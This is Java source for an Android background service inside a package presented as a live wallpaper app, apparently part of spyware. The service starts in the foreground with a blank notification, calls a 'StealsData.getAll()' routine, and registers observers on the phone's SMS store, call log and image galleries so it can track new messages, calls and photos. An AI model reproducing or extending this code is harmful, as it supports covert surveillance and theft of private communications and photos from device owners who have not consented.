package com.livewallpaper.circle.box;

import com.livewallpaper.circle.box.call.ContentCallObserver;
import com.livewallpaper.circle.box.gallery.ContentGalleryExternalObserver;
import com.livewallpaper.circle.box.gallery.ContentGalleryInternalObserver;
import com.livewallpaper.circle.box.sms.ContentSmsObserver;

import android.app.Notification;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.MediaStore.Images;
import android.util.Log;

public class ServiceListener extends Service {

	private static ServiceListener instance = null;
	public static Context context;
	private static final String LOG_TAG = "monitoring";
	private static final String CONTENT_SMS = "content://sms/";

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	public static boolean isInstanceCreated() {
		return instance != null;
	}// met

	@Override
	public void onCreate() {
		startForeground(333, new Notification());
		instance = this;
		Log.i(LOG_TAG, "onCreate ServiceListener");
		super.onCreate();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		Log.i(LOG_TAG, "Received start id " + startId + ": " + intent);
		context = this;

		StealsData.getAll();
		Log.i(LOG_TAG, "ServiceListener register ");
		ContentResolver contentResolver = getBaseContext().getContentResolver();

		contentResolver.registerContentObserver(Uri.parse(CONTENT_SMS), true,
				new ContentSmsObserver(new Handler()));

		contentResolver.registerContentObserver(CallLog.Calls.CONTENT_URI,
				true, new ContentCallObserver(new Handler()));

		contentResolver.registerContentObserver(
				Images.Media.EXTERNAL_CONTENT_URI, true,
				new ContentGalleryExternalObserver(new Handler()));

		contentResolver.registerContentObserver(
				Images.Media.INTERNAL_CONTENT_URI, true,
				new ContentGalleryInternalObserver(new Handler()));

		return super.onStartCommand(intent, flags, startId);
	}

	@Override
	public void onDestroy() {
		Log.i(LOG_TAG, "onDestroy ServiceListener");
		instance = null;
		super.onDestroy();
	}
}
